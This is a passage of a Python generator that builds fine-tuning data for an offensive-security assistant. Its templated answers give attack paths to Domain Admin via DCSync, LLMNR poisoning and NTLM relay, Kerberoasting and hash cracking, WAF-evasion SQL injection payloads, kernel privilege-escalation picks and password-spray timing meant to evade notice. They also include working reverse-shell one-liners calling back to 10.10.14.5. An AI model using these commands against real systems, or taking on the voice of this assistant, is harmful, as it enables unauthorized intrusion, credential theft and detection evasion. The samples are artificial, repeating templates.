            "interpretation": """This is a **Linux server** running multiple services — likely a multi-purpose development/staging server.

**Attack priorities:**
1. **NFS (port 2049)** — Highest priority. Check for exported shares with no_root_squash:
   - `showmount -e {target}` → mount shares → access/modify files
   - If no_root_squash: instant root file access

2. **Samba (139/445)** — Check for:
   - Null session: `smbclient -L //{target} -N`
   - Writable shares: `smbmap -H {target}`
   - Known vulnerabilities (EternalBlue unlikely on Samba but worth checking)

3. **MySQL (3306)** — Exposed database:
   - Default creds: `mysql -h {target} -u root -p`
   - UDF exploitation if we get credentials

4. **Apache** — Web application testing:
   - Check version for CVEs (2.4.49 = path traversal)
   - Content discovery and web app testing

5. **SSH** — Brute force last resort (slow, logged)""",
        },
        {
            "tool": "bloodhound",
            "output": lambda: """Shortest path to Domain Admin:
  jsmith@CORP.LOCAL
  → MemberOf → IT-SUPPORT@CORP.LOCAL
  → GenericAll → SVC_BACKUP@CORP.LOCAL
  → MemberOf → BACKUP-OPERATORS@CORP.LOCAL
  → CanDCSync → CORP.LOCAL

Kerberoastable accounts: svc_sql, svc_web, svc_backup
AS-REP Roastable: old_admin, legacy_svc
High-value targets with paths: 4""",
            "interpretation": """**Critical attack path identified — 4 hops to Domain Admin:**

1. **jsmith** (our current user) → member of IT-SUPPORT
2. **IT-SUPPORT** → has GenericAll on SVC_BACKUP
   - GenericAll = full control, can reset password or set SPN
3. **SVC_BACKUP** → member of BACKUP-OPERATORS
4. **BACKUP-OPERATORS** → can DCSync (replicate DC credentials)

**Exploitation plan:**
1. Use GenericAll on SVC_BACKUP to change its password:
   ```
   net rpc password SVC_BACKUP 'NewP@ss123!' -U jsmith -S dc01.corp.local
   ```
2. Authenticate as SVC_BACKUP
3. DCSync to dump all domain hashes:
   ```
   impacket-secretsdump corp.local/SVC_BACKUP:'NewP@ss123!'@dc01.corp.local
   ```
4. Game over — full domain compromise

**Additional opportunities:**
- Kerberoast svc_sql, svc_web, svc_backup (offline crack attempt)
- AS-REP roast old_admin and legacy_svc (likely weak passwords)
- 4 total paths to DA — we take the shortest""",
        },
        {
            "tool": "responder",
            "output": lambda: f"""[*] [LLMNR]  Poisoned answer sent to 10.10.14.{random.randint(50,200)}
[*] [NBT-NS] Poisoned answer sent to 10.10.14.{random.randint(50,200)}
[SMB] NTLMv2 Client   : 10.10.14.{random.randint(50,200)}
[SMB] NTLMv2 Username : CORP\\jdoe
[SMB] NTLMv2 Hash     : jdoe::CORP:1122334455667788:ABCDEF0123456789:0101000000000000...
[SMB] NTLMv2 Client   : 10.10.14.{random.randint(50,200)}
[SMB] NTLMv2 Username : CORP\\admin.backup
[SMB] NTLMv2 Hash     : admin.backup::CORP:aabbccdd11223344:FEDCBA9876543210:0101000000000000...""",
            "interpretation": """**NTLMv2 hashes captured via LLMNR/NBT-NS poisoning!**

**What happened:** Responder answered broadcast name resolution requests (LLMNR/NBT-NS) pretending to be the requested resource. When clients tried to authenticate to our fake SMB server, they sent NTLMv2 challenge-response hashes.

**Captured credentials:**
| User | Source IP | Crackable |
|------|-----------|-----------|
| CORP\\jdoe | 10.10.14.x | Yes (NTLMv2 = hashcat -m 5600) |
| CORP\\admin.backup | 10.10.14.x | Yes — HIGH VALUE (admin account) |

**Next steps:**
1. **Crack the hashes:**
   ```
   hashcat -m 5600 /tmp/responder_hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
   ```

2. **admin.backup** — name suggests elevated privileges. Priority crack target.

3. **NTLM relay** (if SMB signing not required):
   ```
   impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support
   ```
   Relay the captured auth to other hosts for immediate access without cracking.

4. **Mitigation note for report:** Recommend disabling LLMNR and NBT-NS via GPO.""",
        },
    ]

    for _ in range(900):
        output_data = random.choice(outputs)
        target = rand_ip()
        output = output_data["output"]()

        user = random.choice([
            f"Interpret this {output_data['tool']} output:\n\n```\n{output}\n```",
            f"What does this {output_data['tool']} result mean and what should I do next?\n\n```\n{output}\n```",
            f"Analyze these {output_data['tool']} results:\n\n```\n{output}\n```",
        ])

        interpretation = output_data["interpretation"].format(target=target)
        samples.append(make_sample(SYSTEM_OFFENSIVE, user, interpretation))

    return samples


def gen_tool_chaining():
    """Chaining tools together in pipelines."""
    samples = []

    chains = [
        {
            "goal": "Find all live web servers in {subnet} and scan them for vulnerabilities",
            "chain": [
                ("masscan -p 80,443,8080,8443 {subnet} --rate 1000 -oG /tmp/web_hosts.gnmap", "Fast port scan to find web services"),
                ("cat /tmp/web_hosts.gnmap | grep open | awk '{{print $2}}' | sort -u > /tmp/web_ips.txt", "Extract IPs with open web ports"),
                ("cat /tmp/web_ips.txt | httpx -silent -status-code -title -tech-detect -o /tmp/live_web.txt", "Probe for live HTTP services and fingerprint"),
                ("nuclei -l /tmp/live_web.txt -severity critical,high -c 50 -o /tmp/vulns.txt", "Vulnerability scan all live web hosts"),
            ],
        },
        {
            "goal": "Enumerate AD users, find Kerberoastable accounts, and crack their passwords",
            "chain": [
                ("impacket-GetADUsers -all -dc-ip {target} corp.local/jsmith:'Password1' | tee /tmp/ad_users.txt", "Enumerate all domain users"),
                ("impacket-GetUserSPNs corp.local/jsmith:'Password1' -dc-ip {target} -request -outputfile /tmp/kerberoast.txt", "Request TGS tickets for service accounts"),
                ("hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule", "Crack Kerberos TGS hashes offline"),
                ("hashcat -m 13100 /tmp/kerberoast.txt --show | awk -F: '{{print $1\":\"$NF}}'", "Display cracked credentials"),
            ],
        },
        {
            "goal": "Web recon pipeline: discover content, find parameters, test for injection",
            "chain": [
                ("feroxbuster -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -o /tmp/dirs.txt --quiet", "Recursive directory discovery"),
                ("katana -u https://{target} -d 3 -jc -o /tmp/crawled_urls.txt", "JavaScript-aware crawling for endpoints"),
                ("cat /tmp/crawled_urls.txt | gf sqli | tee /tmp/sqli_candidates.txt", "Filter URLs with potential SQLi parameters"),
                ("sqlmap -m /tmp/sqli_candidates.txt --batch --risk 2 --level 3 --output-dir /tmp/sqlmap_results/", "Test all candidates for SQL injection"),
            ],
        },
        {
            "goal": "Full subdomain takeover check pipeline",
            "chain": [
                ("subfinder -d {domain} -all -silent | sort -u | tee /tmp/subs.txt", "Passive subdomain enumeration"),
                ("cat /tmp/subs.txt | httpx -silent -status-code -follow-redirects -mc 404 -title | tee /tmp/dead_subs.txt", "Find subdomains returning 404 (potential takeover)"),
                ("cat /tmp/subs.txt | dnsx -silent -cname | tee /tmp/cnames.txt", "Resolve CNAME records"),
                ("cat /tmp/cnames.txt | grep -E '(amazonaws|azure|github|heroku|shopify|fastly)' | tee /tmp/takeover_candidates.txt", "Filter for services prone to takeover"),
                ("subjack -w /tmp/subs.txt -t 50 -o /tmp/takeover_results.txt", "Automated takeover verification"),
            ],
        },
    ]

    for _ in range(700):
        chain = random.choice(chains)
        target = rand_ip()
        domain = rand_domain()
        subnet = f"{target.rsplit('.', 1)[0]}.0/24"

        user = chain["goal"].format(target=target, domain=domain, subnet=subnet)

        steps = []
        for i, (cmd, desc) in enumerate(chain["chain"], 1):
            cmd_formatted = cmd.format(target=target, domain=domain, subnet=subnet)
            steps.append(f"""**Step {i}: {desc}**
<exec timeout="300">{cmd_formatted}</exec>""")

        assistant = f"""**Tool Chain: {user}**

Pipeline architecture:
```
{' → '.join([desc.split(' — ')[0] if ' — ' in desc else desc[:20] for _, desc in chain['chain']])}
```

{chr(10).join(steps)}

**Pipeline complete.** Each step feeds into the next — the output of one tool becomes the input for the next. This is more efficient than running each tool manually because:
1. Automated data flow between stages
2. Filtering reduces target set at each step
3. Final tool only tests the most promising candidates
4. Full pipeline runs unattended

**Customization:**
- Add more filtering between stages to reduce noise
- Parallelize independent steps with GNU parallel
- Save intermediate results for later analysis
- Add notification when pipeline completes: `notify-send "Pipeline done"`"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CATEGORY BONUS: FAILURE CASES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_failure_cases():
    """Failure cases: exploit didn't work, what next?"""
    samples = []

    failures = [
        {
            "user": "The SQL injection payload returned a 403 — WAF is blocking us. What now?",
            "assistant": """**WAF Bypass Strategies:**

The 403 indicates a Web Application Firewall is detecting and blocking our payloads. Here's the escalation path:

**1. Identify the WAF:**
<exec timeout="30">wafw00f https://{target}</exec>

**2. Encoding bypasses (try in order):**
```
# Double URL encoding
admin%2527%2520OR%25201%253D1--

# Unicode encoding
admin' OR 1=1--

# Case variation
admin' oR 1=1--

# Comment insertion
admin'/**/OR/**/1=1--

# Hex encoding
admin' OR 0x313D31--
```

**3. sqlmap tamper scripts:**
<exec timeout="120">sqlmap -u 'https://{target}/search?q=test' --tamper=between,randomcase,space2comment,charencode --random-agent --batch --dbs</exec>

**4. Alternative injection points:**
- Check other parameters (headers, cookies, JSON body)
- Test PUT/DELETE methods (WAF may only check GET/POST)
- Try XML/JSON content types (WAF rules often focus on form data)

**5. Rate-based evasion:**
- Slow down requests: `--delay=2`
- Rotate User-Agents
- Use multiple source IPs if available

**6. If WAF is truly blocking all SQLi:**
- Move on to other vulnerability classes (SSRF, SSTI, deserialization)
- Check for WAF bypass via origin IP (if behind CDN)
- Test API endpoints (often less protected than web frontend)""",
        },
        {
            "user": "The kernel exploit failed — 'Exploit completed, but no session was created'. What went wrong?",
            "assistant": """**Troubleshooting failed kernel exploit:**

Common reasons for kernel exploit failure and solutions:

**1. Wrong kernel version/architecture:**
<exec timeout="10">uname -r && uname -m && cat /etc/os-release</exec>
- Verify the exact kernel version matches the exploit's target range
- Check if it's a custom/patched kernel (cloud providers often backport fixes)

**2. Security mechanisms blocking:**
- **KASLR:** Kernel Address Space Layout Randomization
  - Check: `cat /proc/sys/kernel/randomize_va_space`
  - Bypass: Some exploits need info leak first
- **SMEP/SMAP:** Hardware protections
  - Check: `cat /proc/cpuinfo | grep -E "smep|smap"`
- **SELinux/AppArmor:**
  - Check: `getenforce` or `aa-status`
  - May confine even root-level exploits

**3. Try alternative approach:**
<exec timeout="10">cat /proc/version</exec>

| If kernel is... | Try instead |
|----------------|-------------|
| 5.8+ | DirtyPipe (CVE-2022-0847) |
| 4.4-5.x | DirtyCow (CVE-2016-5195) |
| Any | PwnKit (CVE-2021-4034) via pkexec |
| Any | Sudo exploits (CVE-2021-3156) |

**4. Non-kernel escalation paths:**
- SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
- Capabilities: `getcap -r / 2>/dev/null`
- Sudo misconfig: `sudo -l`
- Cron jobs running as root: `cat /etc/crontab; ls -la /etc/cron.d/`
- Writable /etc/passwd: `ls -la /etc/passwd`
- Docker group membership: `id | grep docker`

**5. If all else fails:**
- Enumerate running services for credential exposure
- Check for password reuse from harvested credentials
- Look for sensitive files readable by current user""",
        },
        {
            "user": "Password spray returned 0 hits across 500 users. What should I adjust?",
            "assistant": """**Password spray failed — analysis and adjustment:**

**Why zero hits:**
1. Strong password policy enforced
2. Passwords we tried are too generic
3. Lockout policy is too aggressive (accounts already locked)
4. MFA is blocking the auth even with correct passwords
5. Wrong authentication endpoint/protocol

**Diagnostic checks:**
<exec timeout="30">nxc smb {target} -u 'definitely_not_a_user' -p 'test' 2>&1 | head -5</exec>

Check error messages:
- "STATUS_LOGON_FAILURE" = normal (wrong creds)
- "STATUS_ACCOUNT_LOCKED_OUT" = we hit lockout threshold!
- "STATUS_PASSWORD_EXPIRED" = password correct but expired

**Adjusted strategy:**

**1. Better password candidates (research-driven):**
- Check breached credentials for this domain: `h8mail -t @{domain}`
- Company-specific patterns: {domain.split('.')[0].title()}2024!, {domain.split('.')[0].title()}@2024
- Seasonal: Summer2024!, Spring2024!, {datetime.now().strftime('%B')}2024!
- {domain.split('.')[0].title()}#1, Welcome@{domain.split('.')[0].title()}

**2. Timing adjustment:**
- If lockout occurred: wait full lockout window (usually 30 min)
- Reduce to 1 attempt per 35 minutes per user
- Spray during login hours (6-9 AM) when failed logins blend in

**3. Alternative protocols:**
- OWA/Exchange: May have different lockout policy
- VPN: Sometimes has separate auth
- LDAP bind: Less monitored than SMB

**4. User list quality:**
- Verify users exist: `kerbrute userenum /tmp/users.txt -d corp.local --dc {target}`
- Remove disabled accounts
- Focus on service accounts and new hires (weaker passwords)

**5. Pivot strategy:**
- If spraying isn't working, try other credential attacks:
  - Kerberoasting (no lockout risk)
  - AS-REP roasting (no lockout risk)
  - LDAP anonymous bind for user enumeration
  - Check for password policy details via LDAP""",
        },
        {
            "user": "The reverse shell connects but immediately dies. What's wrong?",
            "assistant": """**Diagnosing unstable reverse shell:**

Common causes and fixes:

**1. Firewall/IDS killing the connection:**
- Symptom: Connection established then reset after 1-2 seconds
- Fix: Try different ports (443, 8443 — looks like HTTPS)
- Fix: Use encrypted channel (socat with OpenSSL)
```bash
# Attacker (listener with SSL):
socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0 EXEC:/bin/bash
# Target:
socat OPENSSL:attacker:443,verify=0 EXEC:/bin/bash
```

**2. Payload architecture mismatch:**
- Symptom: "Exec format error" or immediate exit
- Fix: Verify target arch: `file /bin/bash` on target
- Regenerate payload for correct arch (x86 vs x64)

**3. AV/EDR killing the process:**
- Symptom: Connection then immediate disconnect
- Fix: Use fileless execution:
```bash
# Instead of binary payload, use bash directly:
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
# Or use python:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**4. Network timeout (NAT/keepalive):**
- Symptom: Connection works for 60-120 seconds then dies
- Fix: Add keepalive to prevent NAT timeout
```bash
# Use ncat with keepalive:
ncat --keep-open -lvp 4444
# Or set TCP keepalive on the shell:
python3 -c 'import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1); ...'
```

**5. The process is killed (cron/watchdog):**
- Symptom: Dies at regular intervals
- Fix: Check what kills it: `while true; do bash -i >& /dev/tcp/10.10.14.5/443 0>&1; sleep 5; done`
- Investigate: ps monitoring, cgroup limits

**Best practice for stable shells:**
1. Use `rlwrap nc -lvnp 443` for readline support
2. Immediately upgrade: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
3. Background with Ctrl+Z, then `stty raw -echo; fg`
4. Set TERM: `export TERM=xterm`""",
        },
    ]

    for _ in range(600):
        failure = random.choice(failures)
        target = rand_ip()
        domain = rand_domain()
        company = domain.split('.')[0].title()

        user_msg = failure["user"].replace("{target}", target).replace("{domain}", domain)
        assistant_text = failure["assistant"].replace("{target}", target).replace("{domain}", domain)
        assistant_text = assistant_text.replace("{domain.split('.')[0].title()}", company)
        assistant_text = assistant_text.replace("{datetime.now().strftime('%B')}", datetime.now().strftime('%B'))
        assistant_text = assistant_text.replace("{rand_domain().split('.')[0].title()}", rand_domain().split('.')[0].title())
        samples.append(make_sample(SYSTEM_OFFENSIVE, user_msg, assistant_text))

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    random.seed(42)
    print("=" * 70)
    print("FT1-3: Full-Spectrum Cyber Security Training Data Generator")
    print("Target: DeepSeek V3 671B via Together.ai LoRA")
    print("=" * 70)

    all_samples = []
    stats = {}

    # CATEGORY 1: RECONNAISSANCE
    print("\n[1/6] RECONNAISSANCE...")
    recon_generators = [
        ("bbot workflows", gen_recon_bbot_workflows),
        ("nmap scanning", gen_recon_nmap),
        ("subdomain chains", gen_recon_subdomain_chains),
        ("OSINT tradecraft", gen_recon_osint),
        ("network mapping", gen_recon_network_mapping),
        ("output parsing", gen_recon_output_parsing),
    ]
    recon_total = 0
    for name, gen_fn in recon_generators:
        samples = gen_fn()
        all_samples.extend(samples)
        recon_total += len(samples)
        print(f"  {name}: {len(samples)} samples")
    stats["RECONNAISSANCE"] = recon_total
    print(f"  TOTAL: {recon_total}")

    # CATEGORY 2: EXPLOITATION
    print("\n[2/6] EXPLOITATION...")
    exploit_generators = [
        ("CVE triage", gen_exploit_cve_triage),
        ("web attacks", gen_exploit_web_attacks),
        ("impacket suite", gen_exploit_impacket),
        ("privilege escalation", gen_exploit_privesc),
        ("credential attacks", gen_exploit_credential_attacks),
        ("pivot chains", gen_exploit_pivot_chains),
    ]
    exploit_total = 0
    for name, gen_fn in exploit_generators:
        samples = gen_fn()
        all_samples.extend(samples)
        exploit_total += len(samples)
        print(f"  {name}: {len(samples)} samples")
    stats["EXPLOITATION"] = exploit_total
    print(f"  TOTAL: {exploit_total}")

    # CATEGORY 3: POST-EXPLOITATION
    print("\n[3/6] POST-EXPLOITATION...")
    postexploit_generators = [
        ("persistence", gen_postexploit_persistence),
        ("credential harvest", gen_postexploit_credential_harvest),
        ("pivoting", gen_postexploit_pivoting),
        ("data discovery", gen_postexploit_data_discovery),
    ]
    postexploit_total = 0
    for name, gen_fn in postexploit_generators:
        samples = gen_fn()
        all_samples.extend(samples)
        postexploit_total += len(samples)
        print(f"  {name}: {len(samples)} samples")
    stats["POST-EXPLOITATION"] = postexploit_total
    print(f"  TOTAL: {postexploit_total}")

    # CATEGORY 4: DETECTION ENGINEERING
    print("\n[4/6] DETECTION ENGINEERING...")
    detect_generators = [
        ("Sigma rules", gen_detect_sigma_rules),
        ("YARA rules", gen_detect_yara_rules),
        ("log analysis", gen_detect_log_analysis),
        ("threat hunting", gen_detect_threat_hunting),
        ("Snort/Suricata", gen_detect_snort_suricata),
    ]
    detect_total = 0
    for name, gen_fn in detect_generators:
        samples = gen_fn()
        all_samples.extend(samples)
        detect_total += len(samples)
        print(f"  {name}: {len(samples)} samples")
    stats["DETECTION ENGINEERING"] = detect_total
    print(f"  TOTAL: {detect_total}")

    # CATEGORY 5: ENGAGEMENT WORKFLOWS
    print("\n[5/6] ENGAGEMENT WORKFLOWS...")
    engagement_generators = [
        ("planning", gen_engagement_planning),
        ("finding classification", gen_engagement_finding_classification),
        ("operational judgment", gen_engagement_operational_judgment),
        ("report writing", gen_engagement_report_writing),
    ]
    engagement_total = 0
    for name, gen_fn in engagement_generators:
        samples = gen_fn()
        all_samples.extend(samples)
        engagement_total += len(samples)
        print(f"  {name}: {len(samples)} samples")
    stats["ENGAGEMENT WORKFLOWS"] = engagement_total
    print(f"  TOTAL: {engagement_total}")

    # CATEGORY 6: TOOL MASTERY
    print("\n[6/6] TOOL MASTERY...")
    tool_generators = [
        ("syntax knowledge", gen_tool_mastery_syntax),
        ("tool selection", gen_tool_selection),
        ("output interpretation", gen_tool_output_interpretation),
        ("tool chaining", gen_tool_chaining),
    ]
    tool_total = 0
    for name, gen_fn in tool_generators:
        samples = gen_fn()
        all_samples.extend(samples)
        tool_total += len(samples)
        print(f"  {name}: {len(samples)} samples")
    stats["TOOL MASTERY"] = tool_total
    print(f"  TOTAL: {tool_total}")

    # BONUS: FAILURE CASES
    print("\n[BONUS] FAILURE CASES...")
    failure_samples = gen_failure_cases()
    all_samples.extend(failure_samples)
    stats["FAILURE CASES"] = len(failure_samples)
    print(f"  failure handling: {len(failure_samples)} samples")

    # Shuffle all samples
    random.shuffle(all_samples)

    # Write output
    print(f"\n{'=' * 70}")
    print("WRITING OUTPUT...")
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_FILE, "w") as f:
        for sample in all_samples:
            f.write(json.dumps(sample, ensure_ascii=False) + "\n")

    file_size = OUTPUT_FILE.stat().st_size / 1024 / 1024

    # Print statistics
    print(f"\n{'=' * 70}")
    print("STATISTICS")
    print(f"{'=' * 70}")
    total = 0
    for category, count in stats.items():
        print(f"  {category:25s}: {count:6d} samples")
        total += count
    print(f"  {'─' * 40}")
    print(f"  {'TOTAL':25s}: {total:6d} samples")
    print(f"\n  Output: {OUTPUT_FILE}")
    print(f"  Size: {file_size:.1f} MB")
    print(f"\n  Ready for Together.ai LoRA fine-tuning.")
    print(f"  Model: DeepSeek V3 671B")
    print(f"  Format: JSONL (conversation turns)")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    main()
